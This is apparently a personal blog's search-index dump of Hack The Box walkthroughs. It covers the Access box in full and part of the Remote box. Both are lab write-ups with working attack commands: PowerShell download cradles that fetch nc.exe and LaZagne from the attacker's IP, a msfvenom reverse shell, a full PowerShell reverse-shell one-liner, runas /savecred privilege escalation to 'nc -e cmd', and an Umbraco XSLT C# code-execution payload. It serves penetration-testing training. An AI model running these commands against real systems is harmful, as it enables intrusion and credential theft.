[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:30 BST Nmap scan report for 10.129.199.196 Host is up (0.040s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: MegaCorp |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 382.99 seconds We can see that so far it\u0026rsquo;s just the 3 services running, FTP, telnet \u0026amp; HTTP \u0026amp; that the system is mostly likely running windows 8 HTTP Enumeration: I run feroxbuster on the domain but the results are slim. The page also appears to be a simple holding page. Telnet Enumeration: Telnet Enumeration:\nNot really much here to be honest. kali in 46-Boxes/46.02-HTB/Access/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 19:31:45 zsh ❯ nmap -n -sV -Pn --script \u0026#34;*telnet* and safe\u0026#34; -p 23 $box -oA telnetScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 09:54 BST Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.129.199.196 Host is up (0.036s latency). PORT STATE SERVICE VERSION 23/tcp open telnet? Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 176.99 seconds FTP Enumeration: I connect via FTP and can see there are shares available. Backups Share Enumeration: I can see in the Backups share there is a file called backup.mdb\nAn MDB file is a database file created by Microsoft Access, a widely-used desktop relational database program. It contains the database structure (tables and fields) and database entries (table rows). MDB files may also store data entry forms, queries, stored procedures, reports, and database security settings.\nMore Information\nSo this could be good as it could contain creds etc: It\u0026rsquo;s been replaced by the newer .accdb format. It could include basic password protection but the format lacks advanced encryption, making it less secure than newer formats. I try and download it using netexec, but it loses it\u0026rsquo;s damn-mind:\nI figured I\u0026rsquo;d try netexec\u0026rsquo;s ftp download method, but that\u0026rsquo;s what I get for trying something new I suppose. I then continue to have consistent issues with Passive mode:\nHowever there is a way around this and you can just download all of the data at once using wget: Command: wget -m –no-passive ftp://anonymous:anonymous@$box backup.mdb enumeration: I run strings on the file and can see some interesting things like potential usernames/fields:\nI tried to open the file with dbeaver but for some reason it would not display correctly.\nThere is luckily a probject called mdbtools we can use:\nhttps://github.com/mdbtools/mdbtools sudo apt install mdbtools Find out how many tables \u0026amp; their names:\nAs we can see there is an entry called auth_user I dump this entry \u0026amp; get 3 lots of creds:\nSo we have 3 sets of creds, lets take a look at the other services share:\nAlt options: I find the website: https://www.mdbopener.com/ which let you upload the file \u0026amp; have it extract all the tables to .csv files. +Note+: I WOULD NEVER DO THIS OR SUGGEST THIS ON AN ENGAGEMENT!!!! But this is an option for this challenge/box. (I chose not too as I want to make it as close to life as possible for me) Engineer Share Enumeration: There is a .zip file in here called Access Control.zip\nI try and unzip but I am denied as it has access control on it which means password protection\nI run file on it to ensure it\u0026rsquo;s actually a .zip \u0026amp; it is, encrypted with AES.\nI run zip2john on it to generate a hash.\nI run it through rockyou but get no hits.\nI extract it in my gui and use one of the passwords I extracted from the .mdb \u0026amp; it works!\nI am given a file called Access Control.pst Viewing Contents of the .pst file: What is a .pst: A PST file is a data storage file that contains personal information used by Microsoft Outlook and Exchange. It may also include e-mail folders, contacts, addresses, and other data.\nSo this could hold even more valuable information!\nI switch to my Windows VM and download this software so I can view the contents of the .pst:\nhttps://www.ostpstviewer.com/download.aspx Once imported, I find a single email which contains a password for the security user:\n2. Foothold: With the new credentials for security I login to the telnet server\nIt gives me access to the C:\\ drive of the host.\nSystem Info: I can see the system is actually running Microsoft Windows Server 2008 R2 Standard Shell Upgrade: Initially I try and run powershell but it crashes.\nTelnet is trash, well it\u0026rsquo;s not as we are accessing the host via it, but it\u0026rsquo;s not great to work in. It\u0026rsquo;s slow and doesn\u0026rsquo;t allow us to delete characters. Lets upgrade our shell.\nFuture bloodstiller here:\nWe can actually get a good powershell session from telnet by doing the following: powershell -File - This was not something I was aware of until I had finished the box \u0026amp; read 0xdf\u0026rsquo;s awesome write-up: https://0xdf.gitlab.io/2019/03/02/htb-access.html (i like to read other writeups after I have finished mine to see what I could have done differently and find a different perspective \u0026amp; approach) I start a python server on my attack machine to host my nc.exe binary:\nI execute powershell from CMD \u0026amp; get it to download the nc.exe binary:\npowershell -c \u0026quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.44:9000/shell.exe','C:\\Users\\Security\\shell.exe')\u0026quot; Start my nc listener on my attack host:\nnc -nvlp 9999 Trigger nc on the target to connect back:\nAnnnnnnnnnd we are blocked by group policy! Sneaky admins. Lets try a super encoded shell:\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=9999 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o newshell1.exe BLOCKED AGAIN! We can assume that anything not on a strict \u0026ldquo;allow\u0026rdquo; list is blocked by Group Policy. So let\u0026rsquo;s switch gears and just live off the land with good ol\u0026rsquo; powershell.\nSimple Powershell reverse shell:\nFinally we get a connection with the below, I have this saved into my notes as a goto but if you are unfamiliar you can also generate it with: https://www.revshells.com/ powershell -nop -c \u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.10.14.44\u0026#39;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34; ZTeko Enumeration: I find a file folder called ZKTeco in the root folder.\nIt appears to contain a copy of a program called ZKAccess3.5\nA quick search turns up this public exploit:\nhttps://www.exploit-db.com/exploits/40323 Desc: ZKAccess suffers from an elevation of privileges vulnerability which can be used by a simple authenticated user that can change the executable file with a binary of choice. The vulnerability exist due to the improper permissions, with the \u0026lsquo;M\u0026rsquo; flag (Modify) for \u0026lsquo;Authenticated Users\u0026rsquo; group.\nI check the permissions to see if it\u0026rsquo;s vulnerable:\nIt\u0026rsquo;s not, we are missing the \u0026quot;M\u0026quot; flag for modify for any of the users groups.\nSo it appears this is not vulnerable to this specific exploit but I will put a pin in it, incase we can somehow leverage it later on. System Enumeration: We need to enumerate more to find a viable privesc path. So WinPeas etc is great but I have been trying to manually enumerate more as a way to get better at living off the land and working with the tools locally. Let\u0026rsquo;s do some standard enumeration and see what we have available. User Privs: Little in the way of user or group privs: Installed Programs: I check for installed programs. (\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation, InstallDate | Format-Table -AutoSize The only thing that jumps out at me is the ZKTeco software again. 3. Privesc: cmdkey /list discovery: I run cmdkey /list \u0026amp; get a hit: So we can see that the Administrator has a domain password stored on this machine! cmdkey /list displays a list of stored usernames and credentials on the system. It won\u0026rsquo;t let us actually view the creds however we can start enumerating for files that would use this feature. Now, we need to figure out what it\u0026rsquo;s actually stored for, as windows may store creds for multiple reasons. lnk file enumeration: One reason that the system may have stored credentials is so that a binary can be run with elevated privileges without the administrator having to enter their credentials every time it runs.\nA common way to do this is to use the runas /savecred switch within a shortcut/lnk file:\nE.G. create a new lnk/shorcut file on windows but make the content the following:\nrunas /user:\u0026lt;username\u0026gt; /savecred \u0026quot;Your Executable Here\u0026quot; this will generate a shortcut file. It will request the credentials for the specified user the first time it\u0026rsquo;s run \u0026amp; store those credentials, but after that it will run in the context of that user every time by using the stored credentials. The key thing for us as pentesters is this Once credentials are saved using runas /savecred, any application can be run in the context of that account without re-entering the credentials. When these lnk files are generated they retain the runas string within them and we can enumerate and search for these to find out if this is a viable privesc path: We can enumerate stored lnk files by doing the below and checking them for runas as strings: Generate a list of all lnk files on the system:\nGet-ChildItem \u0026#34;C:\\\u0026#34; *.lnk -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object { $_.FullName } | Out-File lnkFiles.txt Command Breakdown: Get-ChildItem \u0026quot;C:\\\u0026quot; *.lnk -Recurse -Force -ErrorAction SilentlyContinue\nGet-ChildItem: Retrieves a list of items (files and directories) from the specified location. \u0026quot;C:\\\u0026quot;: Specifies the root directory of the C:\\ drive to search. *.lnk: Filters the search to only include files with the .lnk extension (shortcut files). -Recurse: Instructs PowerShell to search through all subdirectories of C:\\, not just the top-level directory. -Force: Includes hidden and system files in the search. -ErrorAction SilentlyContinue: Suppresses error messages (like permission denied errors) from being displayed. | Where-Object { $_.PSIsContainer -eq $false }\n|: Passes the output of Get-ChildItem to the next command in the pipeline. Where-Object: Filters objects passed through the pipeline based on a condition. $_: Represents the current object in the pipeline. PSIsContainer -eq $false: Ensures that only files (not directories) are passed through the pipeline. The PSIsContainer property is true for directories and false for files. | ForEach-Object { $_.FullName }\n|: Continues passing the filtered files to the next command. ForEach-Object { $_.FullName }: Iterates over each file and extracts the FullName property, which is the complete path to the file. | Out-File lnkFiles.txt\n|: Pipes the full file paths to the final command. Out-File lnkFiles.txt: Writes the output (the list of full file paths) to the file lnkFiles.txt. Loop through the generated list try and read any text stored in the .lnk file:\nForEach($file in Get-Content .\\lnkFiles.txt) { Write-Output $file; Get-Content $file | Select-String runas -ErrorAction SilentlyContinue } Command Breakdown: ForEach($file in Get-Content .\\lnkFiles.txt)\nForEach($file in Get-Content .\\lnkFiles.txt): Loops through each line (representing file paths) in the lnkFiles.txt file. Get-Content .\\lnkFiles.txt: Reads the contents of lnkFiles.txt and treats each line (file path) as an item. $file: Represents the current file path from the loop. { Write-Output $file;\nWrite-Output $file: Outputs the current file path being processed (for visibility or logging purposes). ``This prints the file path from lnkFiles.txt to the console or wherever the output is being redirected. Get-Content $file |\nGet-Content $file: Reads the content of the file represented by $file. $file is the current file path from the lnkFiles.txt file. Select-String runas -ErrorAction SilentlyContinue }\n|: Pipes the content of the file into the next command. Select-String runas: Searches the file\u0026rsquo;s content for the string \u0026quot;runas\u0026quot;. If \u0026quot;runas\u0026quot; is found, the corresponding line will be output. -ErrorAction SilentlyContinue: Suppresses any errors (e.g., if the file doesn\u0026rsquo;t exist or there are issues reading it). We get a hit!!! Tells us it is a lnk file for the ZKAccess3.5 binary. We can see \u0026ldquo;runas.exe\u0026rdquo; is being used. We can see the parmaters for the lnk file when it was created are: \u0026ldquo;/user:ACCESS\\Administrator /savecred \u0026quot;C:\\ZKTeco\\ZKAccess3.5\\Access.exe\u0026quot;\u0026rdquo; The SID is the 500 sid which is the Administrator built in default account \u0026amp; SID so we know it is 100% running in the context of that user when triggered. This means we can run any command in the context of the Administrator. 4. Ownership: Now that we know our privesc path I transfer my nc binary over to the host:\nTransfer nc binary:\npowershell -c \u0026quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.29:9000/nc.exe','C:\\Users\\Security\\nc.exe')\u0026quot; Setup my listener: on my own host:\nnc -nvlp 9999 Trigger the exploit by running nc in the context of the administrator:\nrunas /user:ACCESS\\Administrator /savecred \u0026quot;C:\\Users\\security\\nc.exe 10.10.14.29 9999 -e cmd\u0026quot; Get my root shell:\nGet the flag:\n5. Persistence: I transfer LaZagne.exe over to the host: https://github.com/AlessandroZ/LaZagne powershell -c \u0026quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.29:9000/LaZagne.exe','C:\\Users\\Security\\lz.exe')\u0026quot;\nI then run it and extract the hashes:\nI also get the clear text password for the Administrator user:\nI Verify this is correct by checking I can login as that user:\nI now have persistence. Lessons Learned: What did I learn? I learned a lot more lnk files and how they hold information. I learned how to upgrade the telnet shell (I was not aware that was a thing until now) I laerned about pst files, I had not encountered them before, so that was new \u0026amp; fun. What silly mistakes did I make? Repeatedly trying to use a reverse shell \u0026amp; get nc to work when the GPO was in place. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/access-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/lnk\/": {
        "title": "Lnk",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/lnk\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pst\/": {
        "title": "Pst",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pst\/"
    },
    
    "http:\/\/localhost:1313\/tags\/telnet\/": {
        "title": "Telnet",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/telnet\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/remote-box\/": {
        "title": "Remote HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Active Directory","Windows","SeImpersonatePrivilege","Umbraco","CSharp",],
        "content": "Hack The Box Remote Walkthrough/Writeup: https://app.hackthebox.com/machines/Remote How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP-Scans: Basic Scan: I do this simple scan just get a lay of the land:\nkali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans 2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh 🕙 09:02:23 zsh ❯ nmap $box -Pn -sT Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 09:02 BST Nmap scan report for 10.129.200.122 Host is up (0.039s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 2049/tcp open nfs Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds We can see there is some low hanging fruit FTP, SMB, NFS \u0026amp; HTTP we will enumerate these whilst we have a more intensive NMAP Scan run: In-Depth Scan: More in depth scan kali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans 2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh took 17s 🕙 09:06:54 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 09:07 BST Nmap scan report for 10.129.200.122 Host is up (0.037s latency). Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind? |_rpcinfo: ERROR: Script execution failed (use -d to debug) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49678/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=9/8%OT=21%CT=1%CU=44443%PV=Y%DS=2%DC=I%G=Y%TM=66DD5 OS:BE2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%T OS:S=U)SEQ(SP=106%GCD=2%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS% OS:O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=F OS:FFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M OS:53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=8 OS:0%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0% OS:Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z% OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y% OS:DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIP OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 59m59s | smb2-time: | date: 2024-09-08T09:09:49 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 143.44 seconds FTP 21 Enumeration: I connect but is shows there is no information in the share. Just to ensure I am not being crazy I try to download all files using wget. wget -m --no-passive ftp://anonymous:anonymous@$box However, there is nothing in the FTP share so we can move on. SMB 445 Enumeration: I check for null session \u0026amp; guest account but these are both disabled for SMB: netexec smb $box -u '' -p '' --shares\nnetexec smb $box -u 'guest' -p '' --shares\nDiscoveries:\nWe can see the hose is Running Windows 10 or Server 2019 \u0026amp; that SMB Signing is disabled (This would be great if we had more than one machine in the env as we could do a relay attack) There doesn\u0026rsquo;t seem to be much else here, so let\u0026rsquo;s move on.\nNFS 2049 Enumeration: As NFS by default is very insecure (unless using kerberos you can only limit the source IP connections) we can mount the share locally.\nCreate target folder to mount it to:\nmkdir target-NFS Mount the share:\nsudo mount -t nfs $box:/ ./target-NFS -o nolock\nWe find it has the site_backups folder:\nThis could mean it has hard coded creds in it or other interesting things. Log Files: Looking through the NFS share I find a Logs folder:\nGrepping through the files we see the following entry:\nPasword information:\nSo from this we can see that the site is running Umbraco \u0026amp; that the password is 10 chars long as a minimum: I then see these login attempts:\nWe can see the valid admin user is admin@htb.local \u0026amp; not admin Enumerating The Version Number: After some hunting I found this page that tells us how to enumerate the version of Umbraco.\nhttps://our.umbraco.com/forum/getting-started/installing-umbraco/15825-Umbraco-version-and-a-test-site I grep the Web.Config and find the version is 7.12.4\nI run a quick search on exploit-db and find the following authenticated exploit:\nhttps://www.exploit-db.com/exploits/49488 It is an authenticated exploit so we can safely assume that there will be some credentials somewhere, either in this share or on the site. I find the Admin Panel Login Page: http://10.129.200.122/umbraco/#/login The hunt for credentials: I find this file Umbraco.sdf in the App_Data directory: I had never heard of this file but after some searching found the following:\nWhat is an SDF file? An SDF file contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft. It is designed for applications that run on mobile devices and desktops and contains the complete database contents, which may be up to 4GB in size.\nExtracting Data from the .sdf file: Initially after-being unable to view the file locally I spun up a windows VM and tried to extract the data with this tool but it would not work for me (this was a rabbit hole that I spent alot of time on.): https://github.com/christianhelle/sqlcequery Good Old Strings: There be hashes in them thar .sdf files: Eventually I just resorted to running \u0026ldquo;Strings\u0026rdquo; on the file and hoping for the best \u0026amp; guess what, some lovely hashes were at the top! Cracking the hashes: I run the admin hash through hashcat \u0026amp; rockyou:\nIt\u0026rsquo;s SHA1 so cracked easily:\nHTTP Enumeration: Usually I would have done more here, but we have already gotten so far, that I did not have to do basic things like dir-busting just yet (we may come back here) 2. Foothold: I navigate to the Login Page \u0026amp; the creds work: http://10.129.200.122/umbraco/#/login With our creds we now have access to the admin console: There doesn\u0026rsquo;t seem to be much here in the way of information or a clear path to privesc. Getting RCE with public exploits: Exploit 1: I copy the public exploit here to my machine:\nhttps://www.exploit-db.com/exploits/49488 I run it \u0026amp; boom RCE:\nAfter some playing I was only ever able to get single commands to run, I could not use things like Invoke-WebRequest etc to get a shell. I also tried to upload a .bat POC with a simple call back to a running webserver I had, but I couldn\u0026rsquo;t even get that uploaded.\nAfter looking at the source code further for the above exploit, I could see the following line:\n# Based on: https://www.exploit-db.com/exploits/46153 so I had a look a that exploit: Exploit 2: The payload of this scrip has an XSLT (Extensible Stylesheet Language Transformations) script with an embedded C# script within it that executes calc.exe (the calculator).\nIf you\u0026rsquo;re unfamiliar launching calc.exe is a standard way to prove RCE on a machine. payload = \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; \\ xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:msxsl=\u0026#34;urn:schemas-microsoft-com:xslt\u0026#34; \\ xmlns:csharp_user=\u0026#34;http://csharp.mycompany.com/mynamespace\u0026#34;\u0026gt;\\ \u0026lt;msxsl:script language=\u0026#34;C#\u0026#34; implements-prefix=\u0026#34;csharp_user\u0026#34;\u0026gt;public string xml() \\ { string cmd = \u0026#34;\u0026#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\ proc.StartInfo.FileName = \u0026#34;calc.exe\u0026#34;; proc.StartInfo.Arguments = cmd;\\ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\ \u0026lt;/msxsl:script\u0026gt;\u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;csharp_user:xml()\u0026#34;/\u0026gt;\\ \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; \u0026#39;; Let\u0026rsquo;s break this down so we both understand it better:\nKey Components of the Payload - Code Breakdown: XML Declaration:\n\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026#39; Declares the XML version being used. XSLT Stylesheet Declaration:\n\u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:msxsl=\u0026#34;urn:schemas-microsoft-com:xslt\u0026#34; xmlns:csharp_user=\u0026#34;http://csharp.mycompany.com/mynamespace\u0026#34;\u0026gt; This starts the XSLT stylesheet with necessary namespaces for the transformation. xmlns:msxsl: Allows the usage of Microsoft\u0026rsquo;s XSLT extensions. xmlns:csharp_user: Custom namespace for the embedded C# script. Embedded C# Script:\n\u0026lt;msxsl:script language=\u0026#34;C#\u0026#34; implements-prefix=\u0026#34;csharp_user\u0026#34;\u0026gt; This embeds a C# script inside the XSLT. language=\u0026quot;C#\u0026quot;: Specifies that the script is written in C# implements-prefix=\u0026quot;csharp_user\u0026quot;: Links the script to the csharp_user namespace. C# Function to Execute Code:\npublic string xml() { string cmd = \u0026#34;\u0026#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \u0026#34;calc.exe\u0026#34;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = true; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } This function named xml() is designed to execute the calc.exe program: Command Line Args: string cmd = \u0026quot;\u0026quot;; as we can see this allows us pass command line arguments to the program being called, it\u0026rsquo;s empty as we do not need to pass args to calc.exe, but we can use this for later. Process creation: Uses the System.Diagnostics.Process class to launch an external process (calc.exe). Define the process to launch: proc.StartInfo.FileName = \u0026quot;calc.exe\u0026quot; defines calc.exe as the process to launch. Shell behavior: UseShellExecute = false ensures that the process doesn\u0026rsquo;t require a shell to run. Redirect Output: RedirectStandardOutput = true captures the output (although calc.exe doesn\u0026rsquo;t produce output in this context). Return Output: return output; The function finally returns the process output. XSLT Template:\n\u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;csharp_user:xml()\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; The XSLT template calls the xml() function from the csharp_user namespace. The template is applied to the root (/) of the XML document, which means it is executed as soon as the transformation is applied. Why does this work?\nClearly the program is not sanitizing input nor is it sandboxed which means we can execute arbitrary code. POC Test: So instead of running calc.exe we need it to trigger a reverse shell via powershell.\nLet\u0026rsquo;s run a POC to see if we can get this to work. public string xml() { string cmd = \u0026#34;wget http://10.10.14.34/POC\u0026#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \u0026#34;powershell.exe\u0026#34;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } This function named xml() is designed to execute the calc.exe program: Command Line Args: string cmd = \u0026quot;wget http://10.10.14.34/POC\u0026quot;; this is the IP of my host as well as a fake dir POC that I want it to try to connect to. Process creation: Uses the System.Diagnostics.Process class to launch an external process (calc.exe). Define the process to launch: proc.StartInfo.FileName = \u0026quot;powershell.exe\u0026quot; defines PowerShell as the process to launch. Shell behavior: UseShellExecute = false ensures that the process doesn\u0026rsquo;t require a shell to run. Redirect Output: RedirectStandardOutput = true captures the output (useful to redirect to us) Return Output: return output; The function finally returns the process output. Run the exploit \u0026amp; get a hit:\nThis proves it works as I get a connection. Base64 Encoded PowerShell String: So as we have a connection we want to create a payload that we can trigger back to ourselves:\nI navigate to https://www.revshells.com/ and use the PowerShell #3 (Base64) option and generate a reverse shell back to myself.\nI then place this in my script:\nStart my listener \u0026amp; trigger it \u0026amp; Success!!!!\n3. Privesc: Now we have a reverse-shell lets get to work\nImmediately looking at the User\u0026rsquo;s Privilege we have the \u0026ldquo;SeImpersonatePrivilege\u0026rdquo; which means potato exploits or printer exploits could be on the cards.\nSeImpersonatePrivilege Explained: Potato Exploits take advantage of these privileges.\nA security privilege in Windows that allows a process to adopt the security context of another user, typically after that user has been authenticated.\nEssential for scenarios where a service (like SQL Server or IIS) needs to perform operations on behalf of an authenticated user, particularly when accessing resources that require user-specific permissions.\nImpersonation with SeImpersonatePrivilege:\nProcess Tokens Overview: Every process has an associated token that represents the identity and privileges of the account that initiated the process. The token contains security information like user identity, group memberships, and associated privileges. This token is automatically assigned when the process starts, based on the account under which the process is running (e.g., a system account or a user account). Impersonation Using SeImpersonatePrivilege:\nWhen a service impersonates a user, it temporarily uses the user\u0026rsquo;s token to perform actions with the user\u0026rsquo;s permissions. The service can access resources (like file shares) that the user is allowed to access. The privilege allows the process running the service to \u0026ldquo;borrow\u0026rdquo; the identity of another user securely. Summarized: The token of each process defines what that process can do, based on the permissions of the account running it. SeImpersonatePrivilege allows services to use another user\u0026rsquo;s token for performing tasks on their 